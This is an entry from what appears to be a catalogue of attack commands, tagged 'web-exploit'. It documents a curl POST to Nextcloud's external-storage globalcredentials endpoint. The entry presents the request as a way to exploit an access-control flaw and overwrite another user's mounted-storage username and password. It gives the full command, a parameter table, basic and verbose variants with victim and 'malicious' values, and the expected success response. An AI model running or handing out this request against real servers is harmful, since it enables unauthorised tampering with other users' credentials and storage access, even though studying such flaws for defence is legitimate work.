---
id: cmd-curl-nextcloud-uid
data: >-
  curl -X POST
  'https://nextcloud.example.com/index.php/apps/files_external/globalcredentials'
  -H 'Content-Type: application/json' -H 'Cookie: nc_username=admin;
  nc_token=session_token' -d
  '{"uid":"victim_user","user":"POC","password":"anything"}'
tags:
  - web-exploit
  - nextcloud
  - post-request
type: command
output: 'true'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:31.177Z'
verified: false
validated: true
submitted: true
---
# curl-modify-nextcloud-credentials

## Command

```bash
curl -X POST 'https://nextcloud.example.com/index.php/apps/files_external/globalcredentials' -H 'Content-Type: application/json' -H 'Cookie: nc_username=admin; nc_token=session_token' -d '{"uid":"victim_user","user":"POC","password":"anything"}'
```

## Description

This curl command sends a tampered POST request to Nextcloud's external storage globalcredentials endpoint, modifying the target user's (specified by 'uid') authentication details for mounted storages. Use it to exploit the improper access control by injecting new username/password values.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint (replace with actual Nextcloud URL) | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON body format | Yes |
| `-H 'Cookie: ...'` | Includes authentication session (extract from browser) | Yes |
| `-d '{...}'` | JSON payload with 'uid' (victim), 'user', 'password' | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://nextcloud.example.com/index.php/apps/files_external/globalcredentials' -H 'Content-Type: application/json' -H 'Cookie: nc_username=admin; nc_token=abc123' -d '{"uid":"target_user","user":"malicious","password":"hacked"}'
```

### Advanced Usage

```bash
curl -X POST 'https://nextcloud.example.com/index.php/apps/files_external/globalcredentials' -H 'Content-Type: application/json' -H 'Cookie: nc_username=admin; nc_token=abc123' --data-raw '{"uid":"target_user","user":"POC","password":"anything"}' -v
```
(Adds -v for verbose output to debug responses.)

## Expected Output

Successful execution returns a JSON response like `true`, indicating the credentials were updated on the server. Errors may show as `false` or HTTP 403/500 if auth fails or endpoint is protected.

## Related

- [[Related Procedure: Exploit-Nextcloud-External-Storage-UID-Manipulation]]
